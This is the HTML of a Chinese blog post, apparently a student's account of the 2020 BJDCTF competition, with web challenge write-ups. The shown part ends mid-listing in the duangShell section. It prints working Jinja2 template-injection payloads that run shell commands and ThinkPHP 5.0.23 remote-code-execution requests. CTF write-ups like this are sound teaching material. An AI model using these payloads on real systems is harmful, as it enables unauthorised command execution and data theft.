@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第二届的 BJDCTF 也是结束了，收获挺大的，虽然没有得到想要的名次，但是也算是可以给自己一些相应的启发叭。 大致概览这次比赛为期两天，连续的，总共是有七个题型，其分布情况为：    Misc Pwn Crypto Web Reverse Programming BlockChain    10 11 8 10 3 1 2   其中区块链和编程题都没有做过，编程题说是 CTF 中的 ACM，我感">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届 BJDCTF 总结">
+<meta property="og:url" content="http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Du1L0v3">
+<meta property="og:description" content="第二届的 BJDCTF 也是结束了，收获挺大的，虽然没有得到想要的名次，但是也算是可以给自己一些相应的启发叭。 大致概览这次比赛为期两天，连续的，总共是有七个题型，其分布情况为：    Misc Pwn Crypto Web Reverse Programming BlockChain    10 11 8 10 3 1 2   其中区块链和编程题都没有做过，编程题说是 CTF 中的 ACM，我感">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-22T16:36:00.000Z">
+<meta property="article:modified_time" content="2021-11-03T13:42:04.941Z">
+<meta property="article:author" content="Du1L0v3">
+<meta property="article:tag" content="CTF - WriteUp - 杂谈">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>第二届 BJDCTF 总结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2020/03/29/2020-MRCTF-WP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&text=第二届 BJDCTF 总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&is_video=false&description=第二届 BJDCTF 总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第二届 BJDCTF 总结&body=Check out this article: http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&name=第二届 BJDCTF 总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&t=第二届 BJDCTF 总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%A6%82%E8%A7%88"><span class="toc-number">1.</span> <span class="toc-text">大致概览</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E6%88%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">自我分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fake-google"><span class="toc-number">3.1.</span> <span class="toc-text">Fake google</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E9%BB%91%E5%AE%A2"><span class="toc-number">3.2.</span> <span class="toc-text">老黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Schro%CC%88dinger"><span class="toc-number">3.3.</span> <span class="toc-text">Schrödinger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#duangShell"><span class="toc-number">3.4.</span> <span class="toc-text">duangShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.4.1.</span> <span class="toc-text">法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">3.5.</span> <span class="toc-text">假猪套天下第一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%BE%88%E9%95%BF%EF%BC%8C%E4%BD%86%E6%B2%A1%E6%9C%89%E6%9D%A8%E5%A4%A7%E6%A0%91%E9%95%BF"><span class="toc-number">3.6.</span> <span class="toc-text">代码很长，但没有杨大树长</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Girlfriend%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">Girlfriend注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Element-Master"><span class="toc-number">4.</span> <span class="toc-text">Element Master</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        第二届 BJDCTF 总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1L0v3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-22T16:36:00.000Z" itemprop="datePublished">2020-03-23</time>
+        
+        (Updated: <time datetime="2021-11-03T13:42:04.941Z" itemprop="dateModified">2021-11-03</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%9E%8EBB/">瞎BB</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF-WriteUp-%E6%9D%82%E8%B0%88/" rel="tag">CTF - WriteUp - 杂谈</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>第二届的 BJDCTF 也是结束了，收获挺大的，<abbr title='啊，我太菜了'>虽然没有得到想要的名次</abbr>，但是也算是可以给自己一些相应的启发叭。</p>
+<h1 id="大致概览"><a href="#大致概览" class="headerlink" title="大致概览"></a>大致概览</h1><p>这次比赛为期两天，连续的，总共是有七个题型，其分布情况为：</p>
+<table>
+<thead>
+<tr>
+<th>Misc</th>
+<th>Pwn</th>
+<th>Crypto</th>
+<th>Web</th>
+<th>Reverse</th>
+<th>Programming</th>
+<th>BlockChain</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>10</td>
+<td>11</td>
+<td>8</td>
+<td>10</td>
+<td>3</td>
+<td>1</td>
+<td>2</td>
+</tr>
+</tbody></table>
+<p>其中区块链和编程题都没有做过，编程题说是 CTF 中的 ACM，我感觉还是有一些区别的，区块链的话我并不懂，据说可以挖金（?）</p>
+<p>然后对于这些题目的话</p>
+<ul>
+<li>赛中和赛完没多久的我：个人是感觉是有难度的（应该还是我太菜了 🌚）</li>
+<li>赛后复现的我：啊也不是很难8，为啥当时就没做出（应该还是我太菜了 🌚）</li>
+<li>我太菜了 🌚</li>
+</ul>
+<p>比赛从 3 月 21 日 9 点开始，赛前和队员们相互鼓励，还是挺紧张的，哈哈哈</p>
+<p>一开始上去先 A 了 Base64 的签到，<abbr title='栋梁牛逼！'>这题栋梁抢到了一血</abbr> 👍（手动狗头），然后大致看了一下放出来的题目，把逆向的签到题花一分钟 A 掉了，然后直接对 Web 发起进攻，首先是直接冲进谭总的 <code>duangshell</code>，想着谭总出的题一定要拿到一血，但是到了比赛最后还是没有 A 出来，谷歌都翻烂了好吧……😭</p>
+<p>大概中午的时候，老谢就问还有没有逆向题，一看他已经拿了两个逆向的一血了（当时只有两道题，然后他就溜了），然后当时打得太投入就没吃午饭</p>
+<p>然后是下午的时候，泽辰连拿两个一血，真的牛逼，然后当时卓哥也把 Y1nglish 那题 A 了出来，大家都非常开心 😄，然后我是继续 Web，卓哥圆子他们狂刷 Misc、Crypto，然后泽辰他们是去休息了，后来我实在气不过，八九个小时没 A 出一题，谭总开导我要我去刷刷其它的，就去 Misc 和 Crypto 逛了逛，然后回来接着刷 Web，晚饭随便吃了下，然后继续泡 Web，找资料啥的，各种尝试……</p>
+<p>到了晚十点的时候，游戏类的 Pwn 被放了出来，去整了一下贪吃蛇，拿到了第二，也还不错，顺带放松心情</p>
+<p>随随便便就到了凌晨，我吐了我真的还是没做出一道 Web，看看队友们都是十名左右二十名之前的，我是个四十名 🌚，然后一部分队员也是打算<s>深夜开车</s>继续做题，浩哥他们就先去睡觉了，后来大家都断断续续去睡觉了，我寻思着要整出来一道 Web，于是继续做，中间顺便 A 了几道其它的题</p>
+<p>到了七点多的时候感觉不行了就倒了一下，然后十一点多起来继续看题，发现队员们有了新的进展，卓哥已经快前十了，然后浩哥他们都到了前面去了，这个时候所有的题目也开放了，<s>踉踉跄跄</s>奔到了电脑桌前继续整，又没吃早饭中饭……</p>
+<p>然后快一点多钟的时候终于是把 <code>flask</code> —— 本场比赛本菜鸡唯一的一道 Web 做了出来，经过了二十个小时左右，终于 A 出了一道 Web，没有当初想象中做出 Web 的欣喜，内心平静无比（至少 Web 没有爆零，不然我砸死算了）</p>
+<p>队友们也是频频传来捷报，令人心情由为愉悦 😀</p>
+<p>然后继续攻谭总的 <code>duangshell</code> ，一直到了三点多，之前高中的兄弟们喊我出去聚餐，寻思着也这么久没和兄弟们聚聚了，就出去辽，然后在外面用手机 A 了道 Crypto（哈哈哈哈）</p>
+<p>卓哥圆子他们真的强，Misc 和 Crypto 都做了那么多，这次 CTF 的 Misc 和 Crypto 我真的做不来，尤其是 Misc（反正我真想不到），然后泽辰他们也是，Pwn 直接拿了三个一血，还有老谢，逆向一开始只有两道，直接早早地拿了两个一血，就我最菜……😭</p>
+<p>连着两天，中间休息了四个多小时，做了二十多个小时的 Web（后来第二天下午三点多出门了没做了），最后 Web 还只做出了一题，感觉熟练度的确还是很不够，对没见过的题型姿势还是应对不过来，也不咋善于利用搜索引擎…… orz</p>
+<p>本次最后是排在 22 名，做出了总共 9 道题（不算签到题）：</p>
+<table>
+<thead>
+<tr>
+<th>Misc</th>
+<th>Pwn</th>
+<th>Crypto</th>
+<th>Web</th>
+<th>Reverse</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>1</td>
+<td>4</td>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>这次比赛也就差不多这样了，遗憾也有：谭总的题我没做出来，别人拿了一血而且做出来的也不少；痛苦也有：Web 做了这么久，还是“开卷”，搜了这么多，做出来的太少，根本拿不上牌面；疲惫也有：休息得少了，感觉后面身体都使不上力。</p>
+<p>但是呢，斗志永不会被磨灭，这次可以失利，但是下一次一定要讨回来 🤪</p>
+<h1 id="自我分析"><a href="#自我分析" class="headerlink" title="自我分析"></a>自我分析</h1><p>还是先潜心把 Web 彻底学好，这次比赛暴露出了问题：</p>
+<ul>
+<li>对于新的知识点，并不能很好地利用搜索引擎将其盘活</li>
+<li>对于自己做过的知识点，会麻痹大意，认为自己一定可以做出，结果在没做出，或是与自己的预想不相一致的时候，就会茫然，就是那种被当头一棒的感觉，就不知道咋下手了</li>
+<li>太过求快，就是没有正确估量自己的实力，觉得自己一定要多久多久内做完，就容易上头，或者说是急、慌张</li>
+<li>不够细心，有的时候 Hint 就在某个角落，但是自己却错过了（这个地方要多像卓哥学习，他比我细心得多，发现细节的能力 tql）</li>
+<li>平时懒得动手，就是那种漏洞啥的，没有自己去实践，虽然知道有这么回事，但是不太会实际运用</li>
+<li>基础可能并不是特别牢实</li>
+</ul>
+<p>所以痛定思痛，要从今天开始逐步改正这些毛病，认真对待每个问题，争取下次虎符和网鼎杯可以 C 😐</p>
+<p>然后的话，对于副方向，一开始我是打算主 Web 副 Crypto的，后来我看了看，emmmmmmmmm（<s>我可以主 Web 副 Pwn 嘛</s>），咳咳，先不管这么多，先把 Web 学好 👀</p>
+<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>这次比赛，感觉除开 Web 我也没啥多的好写的，以后也不会写 Misc 这一类的题解，就主要写 <abbr title='&pwn！'>Web</abbr> 的吧（赛后复现也整理在这里）</p>
+<ul>
+<li>Fake google（除开这道，其它都是复现）</li>
+<li>老黑客</li>
+<li>Schrödinger</li>
+<li>duangshell</li>
+<li>假猪套天下第一</li>
+<li>代码很长，但没有杨大树长</li>
+<li>Girlfriend注入</li>
+<li>Element Master</li>
+</ul>
+<h2 id="Fake-google"><a href="#Fake-google" class="headerlink" title="Fake google"></a>Fake google</h2><p>本题考察 <a target="_blank" rel="noopener" href='https://zhuanlan.zhihu.com/p/28823933' style='text-decoration: none'>SSTI模板注入</a></p>
+<p>进入网页，发现了<abbr title='谁是 P3 的小女友？'>搜索框</abbr> ，随便输入一个 1，发现页面回显：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P3&#x27;s girlfirend is : 1</span><br></pre></td></tr></table></figure>
+
+<p>猜测是 SSTI，查看源代码，在最顶上的注释发现 Hint：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ssssssti &amp; a little trick --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SSTI 没得跑了，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回 49，然后再输入 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返，返回 7777777，所以是 <abbr title='flask'><a target="_blank" rel="noopener" href='https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E6%94%BB%E5%87%BB'>jinja2 模板</a></abbr></p>
+<p>我们可以构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入，页面回显：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P3&#x27;s girlfirend is : app bd_build bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>可以发现 flag 就在该目录下，我们继续构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后居然给我回显出这个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD in P3&#39;s girlfriend???</span><br></pre></td></tr></table></figure>
+
+<p>emmmm  P3师傅的女朋友是布吉岛（狗头）</p>
+<p>这题卡了很久，想了很久不清楚，我想着是过滤，但是一开始没有想到过滤掉了 flag 的脑袋 BJD，爷服辣，只要绕过这个就 ok 辽，后来我是利用 od 返回十六进制，然后转 ASCII 得到 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;od -x &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P3&#x27;s girlfirend is : 0000000 6c66 6761 367b 3831 6637 3465 2d39 6361 0000020 6161 342d 6435 2d64 6662 6266 662d 3964 0000040 3039 6336 6437 6363 7d37 000a 0000053</span><br></pre></td></tr></table></figure>
+
+<p>去掉无关紧要的字符以及偏移量，又因为是<abbr title='应该是叫这个叭……'>小端存储</abbr>，所以每段都要交换前后两个字符</p>
+<p>然后还有分割的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()[1:]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把首部的 B 去掉了，这样也可以读出，还有很多其他方法……姿势真太多了</p>
+<p>注：BUU 上的是阉割版好8，没有过滤，这样一点灵魂都莫得 🌚</p>
+<h2 id="老黑客"><a href="#老黑客" class="headerlink" title="老黑客"></a>老黑客</h2><p>本题考察  <a target="_blank" rel="noopener" href='https://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/' style='text-decoration: none'>ThinkPHP 5.0.0~5.0.23 RCE</a></p>
+<p>这一题……比赛的时候没做得出，赛后在 BUU 复现的时候发现……太简单了叭，当时的思维完全局限了，嗷，我还是太过于 vegetable</p>
+<p>首先进入被黑掉的页面，发现了 <code>Powered By THINKPHP5</code> 字段，由于之前做过一道 ThinkPHP RCE 的题，所以直接尝试上 payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure>
+
+<p>然后这个时候令人激动的来辣，直接报错了，然后告诉我这个 <code>控制器不存在:\think\app</code>，仔细看了一眼发现似乎是把除开英文符之外的直接过滤掉了，emmm这个时候我没有去考虑别的，我……在寻思着咋去绕过，咋找到一个可以满足题目条件的控制器……所以我前面一直没有做出来 🐷</p>
+<p>后来来了 Hint，说是看看版本，我当时脑抽了哇……我我我在主页面查看 PHP 版本……然并卵，直到比赛结束我都没有做出来，哭了 😥</p>
+<p>然后这会儿再复现一波，发现了报错之后可以查看 ThinkPHP 的版本：<code>THINK_VERSION    5.0.23</code></p>
+<p>……emmm那我们就利用 ThinkPHP 5.0.0~5.0.23 的 RCE 漏洞，构造 payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?s=captcha</span><br><span class="line">POST: _method=__construct&amp;<span class="built_in">filter</span>[]=system&amp;method=get&amp;get[]=ls /</span><br></pre></td></tr></table></figure>
+
+<p>页面报错，但是显示出了信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>可以发现 flag 就在该目录下，我们直接构造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?s=captcha</span><br><span class="line">POST: _method=__construct&amp;<span class="built_in">filter</span>[]=system&amp;method=get&amp;get[]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>爆出 flag</p>
+<h2 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>本题考查  信息收集</p>
+<p>打开页面，看不咋懂英语的我默默地留下了热泪，然后下面还有一个框，有提交按钮和检查按钮，不知道是干嘛的</p>
+<p>审查源代码，发现了提示信息：<code>Note : Remenmber to remove test.php!</code> ，然后果断进入 <code>test.php</code> 一探究竟，是显示了<abbr title='I left some good for you in my admin passwd.So try to get it!'>一段英文</abbr>和两个用以登陆的框</p>
+<p>同时发现了一个 Cookie</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nsosfeboqlbeeatcht2q3p2p45</span><br></pre></td></tr></table></figure>
+
+<p>首先直接就想着是SQL注入，结果注了半天鸡毛用都没有，然后还在想要如何避免弹窗弹出来，所以比赛一直耗在这里，orz</p>
+<p>后来才发现这个页面不是用来看的，是用来填主页面下面的框的 OWO 😱</p>
+<p>我们会主页面输入 <code>test.php </code> input 它就会开始慢慢 fuck 我们的登录页面，但是奇慢无比，fuck 半天再 check 都是失败，我们用 Burp 抓包试试，发现了 Cookie</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nsosfeboqlbeeatcht2q3p2p45; dXNlcg=MTU4NTAxMjIxMQ%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>对比之前看到的 Cookie，这个多了后面的那个，是 Base64 编码，我们解一下码，发现是当前时间戳，<abbr title='因为这里之前有师傅说放空Cookie啥的，orz'>尝试将其放空</abbr>，发现 fuck率 一下子高达 99%，我们 check 一下就得到了一个 B站的 AV号：<code>av11664517</code></p>
+<p>然后去搜下，<abbr title='遇事不决，量子力学；
+解释不通，穿越时空；
+篇幅不够，平行宇宙；
+理论不足，高维种族。'>量子力学（牛逼）</abbr>，也完美契合了题目描述：随机过程随机过，量子力学量力学 😬</p>
+<p>在评论区中发现了 flag，下面全都是诸如干死出题人之类的言论 👍</p>
+<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>本题考查  文件泄露  |  反弹shell  |  Bypass</p>
+<p>谭总出的题，真的很想拿下当时 😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐</p>
+<p>打开页面，发现了这么一段文字：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">how can i give you source code? .swp?!</span><br><span class="line">where is P3rh4ps&#x27;s girl friend ???</span><br></pre></td></tr></table></figure>
+
+<p>很明显的提示，<a target="_blank" rel="noopener" href='https://blog.csdn.net/nzjdsds/article/details/82223841'>vim 文件泄露</a>，正好之前也做过这题，跟进 <code>.index.php.swp</code> 得到文件，在我心爱的 pwn机中用 <code>vim -r index.php.swp</code> 命令查看源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 